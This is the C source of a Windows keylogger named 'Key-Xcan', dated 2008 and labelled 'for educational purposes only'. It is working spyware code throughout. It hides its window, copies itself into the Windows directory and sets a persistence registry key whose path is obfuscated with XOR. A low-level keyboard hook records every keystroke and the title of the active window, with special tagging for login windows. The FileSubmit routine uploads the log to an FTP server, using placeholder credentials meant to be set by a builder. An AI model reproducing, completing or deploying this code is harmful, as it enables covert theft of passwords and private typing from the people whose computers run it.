/*
Key-Xcan
Writen By NoobieDog
Last Updated ~ 2008  

FOR EDUCATIONAL PURPOSES ONLY!!!

ADD ME ON TWITTER @NOOBIEDOG

This software is released under the terms of the  GNU General Public License (GPLv3).

Always compiled with DEVC++
*/
#include <windows.h>
#include <cstdio>
#include <winable.h>
#include <wininet.h>
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "key.h"

int keyNameCount = sizeof(keyNames)/sizeof(LOGCHAR);
int titleNameCount = sizeof(titleName)/sizeof(TITLE);

static BOOL (WINAPI *GetComputerName_)(LPTSTR,LPDWORD);

char sb[256],Md[256],winDir[256],fName[256],szCurTitle[1024],szLastTitle[1024];

char *CPT(char *str) // String crypt functions
{
 unsigned char i;
 unsigned int size;

 size = lstrlen(str); //size of str

 lstrcpy(sb,str); //copy it to sbuff

 if (CK && size < 256) //if CK != 0 and size < MAX_PATH then
 {
  for (i = 0; i < size; i++)  //loop while i < size of str
    sb[i] = sb[i] ^ (CK + (i * (CK % 10) + 1)); 
 }
 return sb; //return string buffer
}

int getFileSize(LPTSTR lpszFilename, DWORD &dwSize) // Getfilesize
{
    HANDLE hFile = CreateFile(lpszFilename, FILE_READ_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE) return 0;
    dwSize = GetFileSize(hFile, NULL);
    CloseHandle(hFile);
    if(dwSize == INVALID_FILE_SIZE) return 0;
    return 1;
}

int FileSubmit() //FTP Logging
{   
    //these strings are place holders, encrypt in final exe.
	//100 characters
	char *FTPS = "FTPS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
	//50 characters each
	char *FTPU = "FTPU\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    char *FTPP = "FTPP\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
        
    HINTERNET hInt,hFtp;
    hInt = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0); // Open internet
    hFtp = InternetConnect(hInt,FTPS,INTERNET_DEFAULT_FTP_PORT,FTPU,FTPP, INTERNET_SERVICE_FTP, 0,0 ); // Open FTP protocal
    if(FtpCreateDirectory(hFtp,"Blood")!=0) // Choose better name
	{
		if(FtpSetCurrentDirectory(hFtp,"Blood")!=0) // Choose better name
		{
            // printf("\r\n%s\r\n", fName);        not needed 
            sprintf(fName, KL, winDir);                                       
			if(FtpPutFile(hFtp, fName, "txt", FTP_TRANSFER_TYPE_BINARY, 0)!=0) // Usernmae and ip?
			{
				//	printf("\r\nfile sent\r\n"); not needed
                    InternetCloseHandle(hFtp); // Close FTp
                    InternetCloseHandle(hInt); // Close Internet 
					return 1;
			}
			else// { printf("\r\nno file sent\r\n"); }     not needed
				return 0;
		}
		else// { printf("\r\nno folder\r\n"); }      not needed
			return 0;
	}
	else// { printf("\r\nno folder\r\n"); }   not needed
		return 0;
}

int FileCheck()
{
    GWD(winDir, 256); // Get windows Dir
    sprintf(fName, KL, winDir); 
    LPTSTR lpszFile = fName;
    DWORD dwSize;
    
    if(getFileSize(lpszFile, dwSize))
    {
        if(dwSize >= 1280) // if log is bigger than 10k then send
        {
         FileSubmit();
        // printf("\r\ntried to send file\r\n");    not needed
        }
        else// { printf("\r\nFile too small\r\n"); }    not needed
             return 0;
    }
    else// { printf("\r\nfailed to get file\r\n"); } not needed
         return 0;
    
    return 0;
}
    
//Use WinMain and compile as GUI to hide window.
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     char*    lpCmdLine,
                     int       nCmdShow) // Create window instance
{	
    char *EXE_NAME = "EXEN\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    //  Get exe name from server setup
    //                              ^^
    CreateMutex(NULL,FALSE,EXE_NAME);  // EXE_NAME mutex
	if(GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);

    strcat(EXE_NAME,".exe"); //Add .exe to end of name
    printf(EXE_NAME);
   // hide app *no need for AllocConsole
	HWND ST=FWA  //#define SW(x,o) ShowWindow(x,o);
    SW(ST,0);    //#define ST stealth
                 //#define FWA FindWindowA("ConsoleWindowClass",NULL);
	        
    //copy its self to win dir and set reg entries
    GWD(winDir, 256); // get the windows dir
    strcat(winDir,"\\"); //seperate windir and exename
    strcat(winDir,EXE_NAME); //Add EXE Name
    HMODULE hMod = GetModuleHandle(0); //Get this file path
    GetModuleFileName(hMod,Md,256); //set path to EXE
    CopyFile(Md,winDir,1); //Copy keylogger to the winDir
  
    // Regisrty input
    HKEY hKey; //declare type.
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,CPT("QlbqqfzlVFen|`c~tgHBy|vmh@^kmRDLWr@TTAFDw~X@"),0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) //Open registry, use encryption to hide plain text
    {
     char *REGE = "REGE\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"; // get reg name from server setup
     // sort registry setting out!!!!!                                                                                          
      RegSetValueEx(hKey,REGE,0, REG_SZ, (const unsigned char*)winDir, strlen(winDir)); //set the key data
      RegCloseKey(hKey); //close the registry
    }
    
    //FileCheck(); // Check File Size
    FileSubmit();
    
    //setup log file to record keylogs
    GWD(winDir, 256); // get the windows dir
    sprintf(fName, KL, winDir); //write to KeyLog file
    logFile = fopen(fName, "a"); // set append on file
    if (logFile == NULL)
    {
     //   printf("\r\nError creating log\r\n"); not needed
        return 1;
    }
    // Record date and time of log
    char *date;
    time_t timer;
    timer=time(NULL);
    date = asctime(localtime(&timer));
    fprintf(logFile, "\r-----------------\r\nDate of log: %s-----------------\r\n", date); // crypt
    
    // Do keylogging
    hHook = SWH; //set windows hook
    while (GetMessage(NULL,NULL,0,0))
    {};
    fclose(logFile);
    return UnhookWindowsHookEx(hHook);
}

KH // Keyboard hook
{
    KBDLLHOOKSTRUCT keyStruct; //hook
    if (nCode < 0)
        return CNH;
        
    if (wParam == KD) // key down
    {
       keyStruct = *(KBDLLHOOKSTRUCT*)lParam;
        bool caps = (GetKeyState(VK_CAPITAL) == 1); // if CAPS on
        
        if (GetKeyState(VK_SHIFT) < 0) //if shift off
        caps = !caps; // = CAPS not 1 (on)

        // Get title of window
        HWND hWnd = GetForegroundWindow(); //get a handle on the current window
        GetWindowText (hWnd,szCurTitle,sizeof(szCurTitle));
        // log title of window and login checking
        if(0 != strcmp(szCurTitle, szLastTitle))
	    { 
             for (int i = 0; i < titleNameCount; i++) 
             {
              char* result = strstr(szCurTitle,titleName[i].gtitle);

              if( result != NULL ) 
              {
              fprintf(logFile, "\r\n[%s][-+- %s -+-]\r\n",titleName[i].dtitle,szCurTitle);
              MCL
              break;
              }
              //maybe put in else here
             }
           fprintf(logFile, "\r\n[%s]\r\n", szCurTitle); //crypt
           MCL
        } 
        // for each keypress determine upper or lower case
        for (int i = 0; i < keyNameCount; i++) 
        {
            if (keyNames[i].pCode == keyStruct.vkCode)
            {
                if (caps)
                    fprintf(logFile, "%s", keyNames[i].upper);
                else fprintf(logFile, "%s", keyNames[i].lower);
                break;
            }
        }

        fflush(logFile);
    }
    return 0;
}
